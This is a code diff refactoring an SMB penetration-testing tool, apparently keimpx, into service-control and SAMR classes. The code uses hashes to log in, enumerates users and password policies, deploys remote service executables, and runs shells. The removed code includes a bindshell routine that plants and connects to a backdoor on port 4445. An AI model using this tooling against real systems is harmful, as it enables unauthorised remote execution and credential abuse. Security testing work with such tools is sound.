@@ -599,627 +599,251 @@ class SvcShell(cmd.Cmd):
         print self.__outputBuffer
         self.__outputBuffer = ''
 
-#######################
-# SMBShell main class #
-#######################
-class SMBShell(cmd.Cmd, object):
-    def __init__(self, target, credential, execute_commands=None):
-        '''
-        Initialize the object variables
-        '''
+def check_dialect(dialect):
+    if dialect == SMB_DIALECT:
+        return 'SMBv1'
+    elif dialect == SMB2_DIALECT_002:
+        return 'SMBv2.0'
+    elif dialect == SMB2_DIALECT_21:
+        return 'SMBv2.1'
+    else:
+        return 'SMBv3.0'
 
-        cmd.Cmd.__init__(self)
+def replace(value):
+    return value.replace('/', '\\')
 
-        self.__target = target
-        self.__dstip = self.__target.getHost()
-        self.__dstport = self.__target.getPort()
-
-        self.smb = None
-        self.__user = credential.getUser()
-        self.__password = credential.getPassword()
-        self.__lmhash = credential.getLMhash()
-        self.__nthash = credential.getNThash()
-        self.__domain = credential.getDomain()
-
-        self.__destfile = '*SMBSERVER' if self.__dstport == 139 else self.__dstip
-        self.__srcfile = conf.name
-
-        self.__timeout = 3
-
-        self.tid = None
-        self.pwd = '\\'
-        self.share = ''
-        self.shares_list = []
-        self.domains_dict = {}
-        self.users_list = set()
-        self.completion = []
-
-        self.__connect()
-        logger.debug('Connection to host %s established' % self.__target.getIdentity())
-        self.__login()
-        logger.debug('Logged in as %s' % (self.__user if not self.__domain else '%s\%s' % (self.__domain, self.__user)))
-
-        logger.info('Launching interactive SMB shell')
-        self.prompt = '# '
-
-        print 'Type help for list of commands'
-
-    def cmdloop(self):
-        while True:
-            try:
-                cmd.Cmd.cmdloop(self)
-            except SessionError, e:
-                #traceback.print_exc()
-                logger.error('SMB error: %s' % (e.getErrorString(), ))
-            except keimpxError, e:
-                logger.error(e)
-            except KeyboardInterrupt, _:
-                print
-                logger.info('User aborted')
-                self.do_exit('')
-            except Exception, e:
-                #traceback.print_exc()
-                logger.error(str(e))
-
-    def __connect(self):
-        '''
-        Connect the SMB session
-        '''
-        self.smb = SMBConnection(self.__destfile, self.__dstip, self.__srcfile, self.__dstport, self.__timeout)
-
-    def __login(self):
-        '''
-        Login over the SMB session
-        '''
-        try:
-            self.smb.login(self.__user, self.__password, self.__domain, self.__lmhash, self.__nthash)
-        except socket.error, e:
-            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
-            raise RuntimeError
-        except SessionError, e:
-            logger.error('SMB error: %s' % (e.getErrorString(), ))
-            raise RuntimeError
-
-    def __replace(self, value):
-        return value.replace('/', '\\')
-
-    def __check_share(self, share=None):
-        if share:
-            self.do_use(share)
-        elif not share and (self.share is None or self.tid is None):
-            logger.warn('Share has not been specified, select one')
-            self.do_shares('')
-
-    def do_help(self, line):
-        '''
-        Show the help menu
-        '''
-
-        print '''Generic options
-===============
-help - show this message
-verbosity {level} - set verbosity level (0-2)
-info - list system information
-exit - terminates the SMB session and exit from the tool
-
-Shares options
-==============
-shares - list available shares
-use {share} - connect to an specific share
-cd {path} - changes the current directory to {path}
-pwd - shows current remote directory
-ls {path} - lists all the files in the current directory
-cat {file} - display content of the selected file
-download {filename} [destfile] - downloads the filename from the current path
-upload {filename} [destfile] - uploads the filename into a remote share (or current path)
-rename {srcfile} {destfile} - rename a file
-mkdir {dirname} - creates the directory under the current path
-rm {file} - removes the selected file
-rmdir {dirname} - removes the directory under the current path
-
-Services options
-================
-services [service name] - list services
-status {service name} - query the status of a service
-query {service name} - list the configuration of a service
-start {service name} - start a service
-stop {service name} - stop a service
-change {service name} - change the configuration of a service (in progress)
-deploy {service name} {local file} [service args] [remote file] [displayname] - deploy remotely a service executable
-undeploy {service name} - undeploy remotely a service executable
-
-Users options
-=============
-users [domain] - list users, optionally for a specific domain
-pswpolicy [domain] - list password policy, optionally for a specific domain
-domains - list domains to which the system is part of
-
-Registry options (Soon)
-================
-regread {registry key} - read a registry key
-regwrite {registry key} {registry value} - add a value to a registry key
-regdelete {registry key} - delete a registry key
-
-Take-over options
-=================
-bindshell [port] - spawn a shell listening on a TCP port on the target
-      This works by upload a custom bind shell, executing it as a service
-      and connecting to a TCP port where it listens, by default 4445/TCP.
-      If the target is behind a strict firewall it may not work.
-svcshell [mode] - semi-interactive shell through a custom Windows Service
-      This works by creating a service to execute a command, redirect its
-      output to a temporary file within a share and retrieving its content,
-      then deleting the service.
-      Mode of operation can be SHARE (default) or SERVER whereby a local
-      SMB server is instantiated to receive the output of the commands. This
-      is useful in the situation where the target machine does not have a
-      writeable share available - no extra ports are required.
-atexec {command} - executes a command through the Task Scheduler service (in progress)
-      Returns the output of such command. No interactive shell, one command
-      at a time - no extra ports are required.
-psexec [command] - executes a command through SMB named pipes (in progress)
-      Same technique employed by Sysinternal's PsExec. The default command
-      is cmd.exe therefore an interactive shell is established. It employs
-      RemComSvc - no extra ports are required.
-'''
-
-    def emptyline(self):
+class Samr(object):
+    def __init__(self):
         pass
 
-    def do_shell(self, cmd):
-        '''
-        Execute a local command if the provided command is preceed by an
-        exclamation mark
-        '''
-        process = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
-        stdout, _ = process.communicate()
+    def users(self, usrdomain):
+        self.__samr_connect()
+        self.__samr_users(usrdomain)
+        self.__samr_disconnect()
 
-        if stdout is not None:
-            print stdout
+    def pswpolicy(self, usrdomain):
+        self.__samr_connect()
+        self.__samr_pswpolicy(usrdomain)
+        self.__samr_disconnect()
 
-    def do_exit(self, line):
+    def domains(self):
+        self.__samr_connect()
+        self.__samr_domains()
+        self.__samr_disconnect()
+
+    def __samr_connect(self):
         '''
-        Disconnect the SMB session
+        Connect to samr named pipe
         '''
-        self.smb.logoff()
-        sys.exit(0)
+        logger.debug('Connecting to the SAMR named pipe')
+        self.smb_transport('samr')
 
-    def do_verbosity(self, level):
-        set_verbosity(level)
-
-    def do_info(self, line):
-        '''
-        Display system information like operating system
-        '''
-
-        self.__smb_transport('srvsvc')
-
-        logger.debug('Binding on Server Service (SRVSVC) interface')
+        logger.debug('Binding on Security Account Manager (SAM) interface')
         self.__dce = self.trans.get_dce_rpc()
-        self.__dce.bind(srvsvc.MSRPC_UUID_SRVSVC)
-        self.__svc = srvsvc.DCERPCSrvSvc(self.__dce)
-        self.__resp = self.__svc.get_server_info_102(self.trans.get_dip())
+        self.__dce.bind(MSRPC_UUID_SAMR)
+        self.__samr = DCERPCSamr(self.__dce)
+        self.__resp = self.__samr.connect()
+        self.__mgr_handle = self.__resp.get_context_handle()
+
+    def __samr_disconnect(self):
+        '''
+        Disconnect from samr named pipe
+        '''
+        logger.debug('Disconneting from the SAMR named pipe')
+
+        if self.__mgr_handle:
+            data = self.__samr.closerequest(self.__mgr_handle)
+
         self.__dce.disconnect()
 
-        print 'Operating system: %s' % self.smb.getServerOS()
-        print 'Netbios name: %s' % self.smb.getServerName()
-        print 'Domain: %s' % self.smb.getServerDomain()
-        print 'SMB dialect: %s' % check_dialect(self.smb.getDialect())
-        print 'NTLMv2 support: %s' % self.smb.doesSupportNTLMv2()
-        print 'UserPath: %s' % self.__resp['UserPath']
-        print 'Simultaneous users: %d' % self.__resp['Users']
-        print 'Version major: %d' % self.__resp['VersionMajor']
-        print 'Version minor: %d' % self.__resp['VersionMinor']
-        print 'Comment: %s' % self.__resp['Comment'] or ''
-
-        # TODO: uncomment when SMBConnection will have a wrapper
-        # getServerTime() method for both SMBv1,2,3
-        #print 'Time: %s' % self.smb.get_server_time()
-
-    def do_shares(self, line):
+    def __samr_users(self, usrdomain=None):
         '''
-        List available shares and display a menu to select which share to
-        connect to
+        Enumerate users on the system
         '''
+        self.__samr_domains(False)
 
-        self.__resp = self.smb.listShares()
-        count = 0
+        encoding = sys.getdefaultencoding()
 
-        for i in range(len(self.__resp)):
-            name = self.__resp[i]['NetName'].decode('utf-16')
-            comment = self.__resp[i]['Remark'].decode('utf-16')
-            count += 1
-            self.shares_list.append(name)
+        for domain_name, domain in self.domains_dict.items():
+            if usrdomain and usrdomain.upper() != domain_name.upper():
+                continue
 
-            print '[%d] %s (comment: %s)' % (count, name, comment)
+            logger.info('Looking up users in domain %s' % domain_name)
 
-        msg = 'Which share do you want to connect to? (default: 1) '
-        limit = len(self.shares_list)
-        choice = read_input(msg, limit)
+            resp = self.__samr.lookupdomain(self.__mgr_handle, domain)
+            resp = self.__samr.opendomain(self.__mgr_handle, resp.get_domain_sid())
+            self.__domain_context_handle = resp.get_context_handle()
+            resp = self.__samr.enumusers(self.__domain_context_handle)
 
-        self.do_use(self.shares_list[choice-1])
+            done = False
 
-    def do_use(self, share):
-        '''
-        Select the share to connect to
-        '''
+            while done is False:
+                for user in resp.get_users().elements():
+                    uname = user.get_name().encode(encoding, 'replace')
+                    uid = user.get_id()
 
-        if not share:
-            raise missingShare, 'Share has not been specified'
+                    r = self.__samr.openuser(self.__domain_context_handle, uid)
+                    logger.debug('Found user %s (UID: %d)' % (uname, uid))
 
-        if self.tid:
-            self.smb.disconnectTree(self.tid)
+                    if r.get_return_code() == 0:
+                        info = self.__samr.queryuserinfo(r.get_context_handle()).get_user_info()
+                        entry = (uname, uid, info)
+                        self.users_list.add(entry)
+                        c = self.__samr.closerequest(r.get_context_handle())
 
-        self.share = share.strip('\x00')
-        self.tid = self.smb.connectTree(self.share)
-        self.pwd = '\\'
-        self.do_ls('', False)
-
-    def complete_cd(self, text, line, begidx, endidx):
-        return self.complete_get(text, line, begidx, endidx, include=2)
-
-    def do_cd(self, path):
-        '''
-        Change the current path
-        '''
-
-        if not path:
-            return
-
-        p = self.__replace(path)
-        self.__oldpwd = self.pwd
-
-        if path == '.':
-            return
-        elif path == '..':
-            sep = self.pwd.split('\\')
-            self.pwd = ''.join('\\%s' % s for s in sep[:-1])
-            return
-
-        if p[0] == '\\':
-           self.pwd = path
-        else:
-           self.pwd = ntpath.join(self.pwd, path)
-
-        self.pwd = ntpath.normpath(self.pwd)
-
-        # Let's try to open the directory to see if it's valid
-        try:
-            fid = self.smb.openFile(self.tid, self.pwd)
-            self.smb.closeFile(self.tid, fid)
-            logger.warn('File is not a directory')
-            self.pwd = self.__oldpwd
-        except SessionError, e:
-            if e.getErrorCode() == nt_errors.STATUS_FILE_IS_A_DIRECTORY:
-               pass
-            elif e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
-                logger.warn('Access denied')
-                self.pwd = self.__oldpwd
-            elif e.getErrorCode() == nt_errors.STATUS_OBJECT_NAME_NOT_FOUND:
-                logger.warn('File not found')
-                self.pwd = self.__oldpwd
-            else:
-                logger.warn('SMB error: %s' % (e.getErrorString(), ))
-                self.pwd = self.__oldpwd
-
-    def do_pwd(self, line):
-        '''
-        Display the current path
-        '''
-
-        print ntpath.join(self.share, self.pwd)
-
-    def do_dir(self, path):
-        '''
-        Alias to ls
-        '''
-        self.do_ls(path)
-
-    def do_ls(self, path, display=True):
-        '''
-        List files from the current path
-        '''
-        self.__check_share()
-
-        if not path:
-            pwd = ntpath.join(self.pwd, '*')
-        else:
-           pwd = ntpath.join(self.pwd, path)
-
-        self.completion = []
-        pwd = self.__replace(pwd)
-        pwd = ntpath.normpath(pwd)
-
-        for f in self.smb.listPath(self.share, pwd):
-            if display is True:
-                print '%s %8s %10d %s' % (time.ctime(float(f.get_mtime_epoch())), '<DIR>' if f.is_directory() > 0 else '', f.get_filesize(), f.get_longname())
-
-            self.completion.append((f.get_longname(),f.is_directory()))
-
-    def complete_cat(self, text, line, begidx, endidx):
-        return self.complete_get(text, line, begidx, endidx, include=1)
-
-    def do_cat(self, filename):
-        '''
-        Display a file content from the current path
-        '''
-        self.__check_share()
-        filename = ntpath.join(self.pwd, self.__replace(filename))
-        self.fid = self.smb.openFile(self.tid, filename)
-        offset = 0
-
-        while 1:
-            try:
-                data = self.smb.readFile(self.tid, self.fid, offset)
-                print data
-
-                if len(data) == 0:
-                    break
-
-                offset += len(data)
-            except SessionError, e:
-                if e.getErrorCode() == nt_errors.STATUS_END_OF_FILE:
-                    break
+                # Do we have more users?
+                if resp.get_return_code() == 0x105:
+                    resp = self.__samr.enumusers(self.__domain_context_handle, resp.get_resume_handle())
                 else:
-                    logger.error('SMB error: %s' % (e.getErrorString(), ))
+                    done = True
 
-        self.smb.closeFile(self.tid, self.fid)
-
-    def complete_get(self, text, line, begidx, endidx, include=1):
-        # include means
-        # 0 all files and directories
-        # 1 just files
-        # 2 just directories
-        p = string.replace(line, '/', '\\')
-
-        if p.find('\\') < 0:
-            items = []
-
-            if include == 1:
-                mask = 0
+            if self.users_list:
+                num = len(self.users_list)
+                logger.info('Retrieved %d user%s' % (num, 's' if num > 1 else ''))
             else:
-                mask = 0x010
+                logger.info('No users enumerated')
 
-            for i in self.completion:
-                if i[1] == mask or include == 0:
-                    items.append(i[0])
+            for entry in self.users_list:
+                user, uid, info = entry
 
-            if text:
-                return [item for item in items if item.upper().startswith(text.upper())]
-            else:
-                return items
+                print user
+                print '  User ID: %d' % uid
+                print '  Group ID: %d' % info.get_group_id()
+                print '  Enabled: %s' % ('False', 'True')[info.is_enabled()]
 
-    def do_get(self, filename, destfile=None):
+                try:
+                    print '  Logon count: %d' % info.get_logon_count()
+                except ValueError:
+                    pass
+
+                try:
+                    print '  Last Logon: %s' % info.get_logon_time()
+                except ValueError:
+                    pass
+
+                try:
+                    print '  Last Logoff: %s' % info.get_logoff_time()
+                except ValueError:
+                    pass
+
+                try:
+                    print '  Kickoff: %s' % info.get_kickoff_time()
+                except ValueError:
+                    pass
+
+                try:
+                    print '  Last password set: %s' % info.get_pwd_last_set()
+                except ValueError:
+                    pass
+
+                try:
+                    print '  Password can change: %s' % info.get_pwd_can_change()
+                except ValueError:
+                    pass
+
+                try:
+                    print '  Password must change: %s' % info.get_pwd_must_change()
+                except ValueError:
+                    pass
+
+                try:
+                    print '  Bad password count: %d' % info.get_bad_pwd_count()
+                except ValueError:
+                    pass
+
+                items = info.get_items()
+
+                for i in MSRPCUserInfo.ITEMS.keys():
+                    name = items[MSRPCUserInfo.ITEMS[i]].get_name()
+                    name = name.encode(encoding, 'replace')
+
+                    if name:
+                        print '  %s: %s' % (i, name)
+
+            self.users_list = set()
+
+    def __samr_pswpolicy(self, usrdomain=None):
         '''
-        Alias to download
+        Enumerate password policy on the system
         '''
-        self.do_download(filename, destfile)
+        self.__samr_domains(False)
 
-    def complete_download(self, text, line, begidx, endidx):
-        return self.complete_get(text, line, begidx, endidx, include=1)
+        encoding = sys.getdefaultencoding()
 
-    def do_download(self, filename, destfile=None):
+        for domain_name, domain in self.domains_dict.items():
+            if usrdomain and usrdomain.upper() != domain_name.upper():
+                continue
+
+            logger.info('Looking up password policy in domain %s' % domain_name)
+
+            resp = self.__samr.lookupdomain(self.__mgr_handle, domain)
+            resp = self.__samr.opendomain(self.__mgr_handle, resp.get_domain_sid())
+            self.__domain_context_handle = resp.get_context_handle()
+            resp = self.__samr.enumpswpolicy(self.__domain_context_handle)
+            resp.print_friendly()
+
+    def __samr_domains(self, display=True):
         '''
-        Download a file from the current path
+        Enumerate domains to which the system is part of
         '''
-        if not destfile:
-            argvalues = shlex.split(filename)
+        logger.info('Enumerating domains')
 
-            if len(argvalues) < 1:
-                raise missingOption, 'You have to specify at least the remote file name'
-            elif len(argvalues) > 1:
-                destfile = argvalues[1]
+        resp = self.__samr.enumdomains(self.__mgr_handle)
+        domains = resp.get_domains().elements()
 
-            filename = argvalues[0]
+        if display is True:
+            print 'Domains:'
 
-        filename = os.path.basename(filename)
-        self.__check_share()
+        for domain in range(0, resp.get_entries_num()):
+            domain = domains[domain]
+            domain_name = domain.get_name()
 
-        if not destfile:
-            destfile = filename
+            if domain_name not in self.domains_dict:
+                self.domains_dict[domain_name] = domain
 
-        fh = open(destfile, 'wb')
-        filename = ntpath.join(self.pwd, self.__replace(filename))
-        self.smb.getFile(self.share, filename, fh.write)
-        fh.close()
+            if display is True:
+                print '  %s' % domain_name
 
-    def do_put(self, pathname, destfile=None):
-        '''
-        Alias to upload
-        '''
-        self.do_upload(pathname, destfile)
+class SvcCtl(object):
+    def __init__(self):
+        pass
 
-    def do_upload(self, pathname, destfile=None):
-        '''
-        Upload a file in the current path
-        '''
-        if not destfile:
-            argvalues = shlex.split(pathname)
-
-            if len(argvalues) < 1:
-                raise missingOption, 'You have to specify at least the local file name'
-            elif len(argvalues) > 1:
-                destfile = argvalues[1]
-
-            pathname = argvalues[0]
-
-        try:
-            fp = open(pathname, 'rb')
-        except IOError:
-            logger.error('Unable to open file %s' % pathname)
-            return False
-
-        self.__check_share()
-
-        if not destfile:
-            destfile = os.path.basename(pathname)
-            destfile = ntpath.join(self.pwd, self.__replace(destfile))
-
-        self.smb.putFile(self.share, destfile, fp.read)
-        fp.close()
-
-    def do_mv(self, srcfile, destfile=None):
-        '''
-        Alias to rename
-        '''
-        self.do_rename(srcfile, destfile)
-
-    def do_rename(self, srcfile, destfile=None):
-        '''
-        Rename a file
-        '''
-        if not destfile:
-            argvalues = shlex.split(srcfile)
-
-            if len(argvalues) != 2:
-                raise missingOption, 'You have to specify source and destination file names'
-            else:
-                srcfile, destfile = argvalues
-                
-        self.__check_share()
-        srcfile = ntpath.join(self.pwd, self.__replace(srcfile))
-        destfile = ntpath.join(self.pwd, self.__replace(destfile))
-        self.smb.rename(self.share, srcfile, destfile)
-
-    def do_mkdir(self, path):
-        '''
-        Create a directory in the current share
-        '''
-        self.__check_share()
-        path = ntpath.join(self.pwd, self.__replace(path))
-        self.smb.createDirectory(self.share, path)
-
-    def complete_rm(self, text, line, begidx, endidx):
-        return self.complete_get(text, line, begidx, endidx, include=1)
-
-    def do_rm(self, filename):
-        '''
-        Remove a file in the current share
-        '''
-        self.__check_share()
-        filename = ntpath.join(self.pwd, self.__replace(filename))
-        self.smb.deleteFile(self.share, filename)
-
-    def complete_rmdir(self, text, line, begidx, endidx):
-        return self.complete_get(text, line, begidx, endidx, include=2)
-
-    def do_rmdir(self, path):
-        '''
-        Remove a directory in the current share
-        '''
-        self.__check_share()
-        path = ntpath.join(self.pwd, self.__replace(path))
-        self.smb.deleteDirectory(self.share, path)
-
-    def do_services(self, srvname):
+    def services(self, srvname):
         self.__svcctl_connect()
         self.__svcctl_list(srvname)
         self.__svcctl_disconnect()
 
-    def do_status(self, srvname):
-        if not srvname:
-            raise missingService, 'Service name has not been specified'
-
+    def status(self, srvname):
         self.__svcctl_connect()
         self.__svcctl_srv_manager(srvname)
         self.__svcctl_status(srvname)
         self.__svcctl_disconnect()
 
-    def do_query(self, srvname):
-        if not srvname:
-            raise missingService, 'Service name has not been specified'
-
+    def query(self, srvname):
         self.__svcctl_connect()
         self.__svcctl_srv_manager(srvname)
         self.__svcctl_config(srvname)
         self.__svcctl_disconnect()
 
-    def do_start(self, srvname, srvargs=''):
-        '''
-        Start a service.
-        '''
-        if not srvargs:
-            argvalues = shlex.split(srvname)
-
-            if len(argvalues) < 1:
-                raise missingService, 'Service name has not been specified'
-            elif len(argvalues) > 1:
-                srvargs = argvalues[1]
-
-            srvname = argvalues[0]
-
+    def start(self, srvname, srvargs=''):
         self.__svcctl_connect()
         self.__svcctl_srv_manager(srvname)
         self.__svcctl_start(srvname, srvargs)
         self.__svcctl_disconnect(srvname)
 
-    def do_stop(self, srvname):
-        '''
-        Stop a service.
-        '''
-        if not srvname:
-            raise missingService, 'Service name has not been specified'
-
+    def stop(self, srvname):
         self.__svcctl_connect()
         self.__svcctl_srv_manager(srvname)
         self.__svcctl_stop(srvname)
         self.__svcctl_disconnect(srvname)
 
-    def do_change(self, srvname):
-        '''
-        Change the configuration of a service.
-        '''
-        if not srvname:
-            raise missingService, 'Service name has not been specified'
-
+    def change(self, srvname):
         self.__svcctl_connect()
         self.__svcctl_srv_manager(srvname)
         self.__svcctl_change(srvname)
         self.__svcctl_disconnect(srvname)
 
-    def do_deploy(self, srvname, local_file=None, srvargs='', remote_file=None, displayname=None):
-        '''
-        Deploy a Windows service: upload the service executable to the
-        file system, create a service as 'Automatic' and start it
-
-        Sample command:
-        deploy shortname contrib/srv_bindshell.exe 5438 remotefile.exe 'long name'
-        '''
-        argvalues = shlex.split(srvname)
-
-        if len(argvalues) < 1:
-            raise missingService, 'Service name has not been specified'
-
-        srvname = argvalues[0]
-
-        if not local_file:
-            if len(argvalues) < 2:
-                raise missingFile, 'Service file %s has not been specified' % local_file
-            if len(argvalues) >= 5:
-                displayname = argvalues[4]
-            if len(argvalues) >= 4:
-                remote_file = argvalues[3]
-            if len(argvalues) >= 3:
-                srvargs = argvalues[2]
-            if len(argvalues) >= 2:
-                local_file = argvalues[1]
-
-        if not os.path.exists(local_file):
-            raise missingFile, 'Service file %s does not exist' % local_file
-
-        srvname = str(srvname)
-        srvargs = str(srvargs)
-
-        if not remote_file:
-            remote_file = str(os.path.basename(local_file.replace('\\', '/')))
-        else:
-            remote_file = str(os.path.basename(remote_file.replace('\\', '/')))
-
-        if not displayname:
-            displayname = srvname
-        else:
-            displayname = str(displayname)
-
+    def deploy(self, srvname, local_file=None, srvargs='', remote_file=None, displayname=None):
         self.__oldpwd = self.pwd
         self.pwd = '\\'
 
@@ -1232,15 +856,7 @@ psexec [command] - executes a command through SMB named pipes (in progress)
 
         self.pwd = self.__oldpwd
 
-    def do_undeploy(self, srvname):
-        '''
-        Wrapper method to undeploy a Windows service. It stops the
-        services, removes it and removes the executable from the file
-        system
-        '''
-        if not srvname:
-            raise missingService, 'Service name has not been specified'
-
+    def undeploy(self, srvname):
         self.__oldpwd = self.pwd
         self.pwd = '\\'
 
@@ -1258,128 +874,7 @@ psexec [command] - executes a command through SMB named pipes (in progress)
         self.__svcctl_bin_remove(remote_file)
         self.pwd = self.__oldpwd
 
-    def do_users(self, usrdomain):
-        '''
-        List users, optionally for a specific domain
-        '''
-        self.__samr_connect()
-        self.__samr_users(usrdomain)
-        self.__samr_disconnect()
-
-    def do_pswpolicy(self, usrdomain):
-        '''
-        List password policy, optionally for a specific domain
-        '''
-        self.__samr_connect()
-        self.__samr_pswpolicy(usrdomain)
-        self.__samr_disconnect()
-
-    def do_domains(self, line):
-        '''
-        List domains to which the system is part of
-        '''
-        self.__samr_connect()
-        self.__samr_domains()
-        self.__samr_disconnect()
-
-    def do_regread(self, reg_key):
-        '''
-        Read a Windows registry key
-        '''
-        if not reg_key:
-            logger.warn('No registry hive provided, going to read %s' % default_reg_key)
-            self.__winreg_key = default_reg_key
-        else:
-            self.__winreg_key = reg_key
-
-        self.__winreg_connect()
-        self.__winreg_open()
-        self.__winreg_read()
-        self.__winreg_disconnect()
-
-    def do_regwrite(self, reg_key, reg_value=None):
-        '''
-        Write a value on a Windows registry key
-        '''
-        self.__winreg_key = reg_key
-        self.__winreg_value = reg_value
-        self.__winreg_connect()
-        self.__winreg_open()
-        self.__winreg_write()
-        self.__winreg_disconnect()
-
-    def do_regdelete(self, reg_key):
-        '''
-        Delete a Windows registry key
-        '''
-        self.__winreg_key = reg_key
-        self.__winreg_connect()
-        self.__winreg_open()
-        self.__winreg_delete()
-        self.__winreg_disconnect()
-
-    def do_bindshell(self, port):
-        '''
-        Spawn a shell listening on a TCP port on the target
-        '''
-        connected = False
-        srvname = ''.join([random.choice(string.letters) for _ in range(8)])
-        local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
-        remote_file = '%s.exe' % ''.join([random.choice(string.lowercase) for _ in range(8)])
-
-        if not port:
-            port = 4445
-        elif not isinstance(port, int):
-            port = int(port)
-
-        if not os.path.exists(local_file):
-            raise missingFile, 'srv_bindshell.exe not found in the contrib subfolder'
-
-        self.do_deploy(srvname, local_file, port, remote_file)
-
-        logger.info('Connecting to backdoor on port %d, wait..' % port)
-
-        for counter in xrange(0, 3):
-            try:
-                time.sleep(1)
-
-                if str(sys.version.split()[0]) >= '2.6':
-                    tn = Telnet(self.__dstip, port, 3)
-                else:
-                    tn = Telnet(self.__dstip, port)
-
-                connected = True
-                tn.interact()
-            except (socket.error, socket.herror, socket.gaierror, socket.timeout), e:
-                if connected is False:
-                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (port, e[1])
-
-                    if counter < 2:
-                        warn_msg += ', retrying..'
-                        logger.warn(warn_msg)
-                    else:
-                        logger.error(warn_msg)
-            except SessionError, e:
-                #traceback.print_exc()
-                logger.error('SMB error: %s' % (e.getErrorString(), ))
-            except KeyboardInterrupt, _:
-                print
-                logger.info('User aborted')
-            except Exception, e:
-                logger.error(str(e))
-
-            if connected is True:
-                tn.close()
-                sys.stdout.flush()
-                break
-
-        time.sleep(1)
-        self.do_undeploy(srvname)
-
-    def do_svcshell(self, mode='SHARE'):
-        '''
-        Semi-interactive shell through a custom Windows Service
-        '''
+    def svcshell(self, mode='SHARE'):
         self.__svcctl_connect()
 
         try:
@@ -1407,33 +902,6 @@ psexec [command] - executes a command through SMB named pipes (in progress)
         sys.stdout.flush()
         self.__svcctl_disconnect()
 
-    def do_atexec(self, command):
-        '''
-        Executes a command through the Task Scheduler service
-        '''
-        logger.warn('Command not yet implemented')
-
-    def do_psexec(self, command):
-        '''
-        Executes a command through SMB named pipes
-        '''
-        logger.warn('Command not yet implemented')
-
-    def __smb_transport(self, named_pipe):
-        '''
-        Initiate a SMB connection on a specific named pipe
-        '''
-        self.trans = transport.SMBTransport(dstip=self.__dstip, dstport=self.__dstport, filename=named_pipe, smb_connection=self.smb)
-
-        try:
-            self.trans.connect()
-        except socket.error, e:
-            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
-            raise RuntimeError
-        except SessionError, e:
-            logger.warn('SMB error: %s' % (e.getErrorString(), ))
-            raise RuntimeError
-
     def __svcctl_srv_manager(self, srvname):
         self.__resp = self.__svc.OpenServiceW(self.__mgr_handle, srvname.encode('utf-16le'))
         self.__svc_handle = self.__resp['ContextHandle']
@@ -1443,7 +911,7 @@ psexec [command] - executes a command through SMB named pipes (in progress)
         Connect to svcctl named pipe
         '''
         logger.debug('Connecting to the SVCCTL named pipe')
-        self.__smb_transport('svcctl')
+        self.smb_transport('svcctl')
 
         logger.debug('Binding on Services Control Manager (SCM) interface')
         self.__dce = self.trans.get_dce_rpc()
@@ -1470,19 +938,19 @@ psexec [command] - executes a command through SMB named pipes (in progress)
         '''
         Upload the service executable
         '''
-        self.__check_share(default_share)
+        self.check_share(default_share)
         self.__pathname = ntpath.join(default_share, remote_file)
         logger.info('Uploading the service executable to %s' % self.__pathname)
-        self.do_upload(local_file, remote_file)
+        self.upload(local_file, remote_file)
 
     def __svcctl_bin_remove(self, remote_file):
         '''
         Remove the service executable
         '''
-        self.__check_share(default_share)
+        self.check_share(default_share)
         self.__pathname = ntpath.join(default_share, remote_file)
         logger.info('Removing the service executable %s' % self.__pathname)
-        self.do_rm(remote_file)
+        self.rm(remote_file)
 
     def __svcctl_create(self, srvname, remote_file, displayname=None):
         '''
@@ -1628,7 +1096,6 @@ psexec [command] - executes a command through SMB named pipes (in progress)
         '''
         Change the configuration of a service
         '''
-
         # TODO
         self.__svc.ChangeServiceConfigW(self.__svc_handle, display, path, service_type, start_type, start_name, password)
 
@@ -1674,318 +1141,790 @@ psexec [command] - executes a command through SMB named pipes (in progress)
 
         print '\nTotal services: %d\n' % num
 
-    def __samr_connect(self):
-        '''
-        Connect to samr named pipe
-        '''
-        logger.debug('Connecting to the SAMR named pipe')
-        self.__smb_transport('samr')
+#######################
+# SMBShell main class #
+#######################
+class SMBShell(SvcCtl, Samr):
+    def __init__(self, target, credential, execute_commands=None):
+        self.__target = target
+        self.__dstip = self.__target.getHost()
+        self.__dstport = self.__target.getPort()
 
-        logger.debug('Binding on Security Account Manager (SAM) interface')
+        self.smb = None
+        self.__user = credential.getUser()
+        self.__password = credential.getPassword()
+        self.__lmhash = credential.getLMhash()
+        self.__nthash = credential.getNThash()
+        self.__domain = credential.getDomain()
+
+        self.__destfile = '*SMBSERVER' if self.__dstport == 139 else self.__dstip
+        self.__srcfile = conf.name
+
+        self.__timeout = 3
+
+        self.tid = None
+        self.pwd = '\\'
+        self.share = ''
+        self.shares_list = []
+        self.domains_dict = {}
+        self.users_list = set()
+        self.completion = []
+
+        self.connect()
+        logger.debug('Connection to host %s established' % self.__target.getIdentity())
+        self.login()
+        logger.debug('Logged in as %s' % (self.__user if not self.__domain else '%s\%s' % (self.__domain, self.__user)))
+
+    def connect(self):
+        '''
+        Connect the SMB session
+        '''
+        self.smb = SMBConnection(self.__destfile, self.__dstip, self.__srcfile, self.__dstport, self.__timeout)
+
+    def login(self):
+        '''
+        Login over the SMB session
+        '''
+        try:
+            self.smb.login(self.__user, self.__password, self.__domain, self.__lmhash, self.__nthash)
+        except socket.error, e:
+            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
+            raise RuntimeError
+        except SessionError, e:
+            logger.error('SMB error: %s' % (e.getErrorString(), ))
+            raise RuntimeError
+
+    def logoff(self):
+        self.smb.logoff()
+
+    def smb_transport(self, named_pipe):
+        '''
+        Initiate a SMB connection on a specific named pipe
+        '''
+        self.trans = transport.SMBTransport(dstip=self.__dstip, dstport=self.__dstport, filename=named_pipe, smb_connection=self.smb)
+
+        try:
+            self.trans.connect()
+        except socket.error, e:
+            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
+            raise RuntimeError
+        except SessionError, e:
+            logger.warn('SMB error: %s' % (e.getErrorString(), ))
+            raise RuntimeError
+
+    def check_share(self, share=None):
+        if share:
+            self.use(share)
+        elif not share and (self.share is None or self.tid is None):
+            logger.warn('Share has not been specified, select one')
+            self.shares()
+
+    def info(self):
+        logger.debug('Binding on Server Service (SRVSVC) interface')
+        self.smb_transport('srvsvc')
         self.__dce = self.trans.get_dce_rpc()
-        self.__dce.bind(MSRPC_UUID_SAMR)
-        self.__samr = DCERPCSamr(self.__dce)
-        self.__resp = self.__samr.connect()
